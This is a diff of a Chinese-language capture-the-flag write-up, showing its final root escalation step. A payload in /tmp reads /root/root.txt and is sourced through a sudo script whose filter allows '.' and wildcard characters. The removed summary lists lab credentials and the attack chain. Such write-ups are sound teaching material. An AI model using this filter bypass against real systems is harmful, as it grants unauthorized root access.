@@ -274,50 +274,29 @@ eval "$CMD"
 先写 payload：
 
 ```bash
-cat > /tmp/! << 'EOF'
-/bin/cat /root/root.txt > /tmp/root.out 2>&1
-id >> /tmp/root.out 2>&1
-EOF
+chaojiwudilong@longshao:~$ cat "/tmp/?"
+/bin/cat /root/root.txt > /tmp/rootflag.txt
 ```
 
 然后通过 `a.sh` 触发：
 
 ```bash
-printf '. !\n' | sudo /usr/local/bin/a.sh
+ sudo /usr/local/bin/a.sh
+ 
+ # 输入：". /tmp/?" 
 ```
 
 读取结果：
 
 ```bash
-cat /tmp/root.out
+cat /tmp/rootflag.txt
 ```
 
 成功：
-
+![](file-20260603214621009.png)
 ```text
 flag{root-e0bf0dabcccb7d4519c0ad4b431aff16}
-uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
 ```
 
-# 总结
-
-这台机器主线还是比较清晰的：
-
-```text
-Web 未授权 dashboard.php
--> 泄露 baolong:jinhua
--> 横向 chaojibaolong:love123
--> sudo check_parser
--> parser_core --debug 切到 chaojiwudilong
--> sudo a.sh
--> 利用符号绕过过滤，source /tmp/!
--> root
-```
-
-几个坑点：
-
-1. `parser_core` 不是直接提权点，它是配合 `sudo /usr/local/bin/check_parser` 用的。
-2. 横向后一定要重新跑 `sudo -l`，不然很容易绕远。
-3. `a.sh` 过滤了字母数字和 `/`，但是没过滤 `.` 和 `!`，所以 `. !` 这种 shell 语法可以绕。
-4. `PATH=/usr/bin`，payload 里用 `cat` 会找不到，所以要写 `/bin/cat`。
 
